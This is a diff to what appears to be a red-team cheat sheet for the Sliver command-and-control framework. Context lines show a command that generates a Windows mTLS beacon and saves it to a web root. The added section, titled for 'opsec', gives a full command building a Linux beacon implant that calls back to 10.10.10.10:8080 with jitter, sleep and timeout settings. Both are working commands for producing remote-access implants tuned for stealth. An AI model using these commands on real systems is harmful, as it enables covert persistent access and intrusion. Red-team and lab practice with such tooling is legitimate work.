@@ -156,6 +156,12 @@ sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --form
 [*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
 ```
 
+### Great Opsec ready beacon&#x20;
+
+```
+generate beacon -a amd64 -c google.com -f exe -J 300 -k 3000 --mtls 10.10.10.10:8080 --name main -o linux -j 1800 --save /opt/sliver/main -S 1800 -t 3600
+```
+
 ### Sliver Survey
 
 * Execute the following commands in order upon session opening
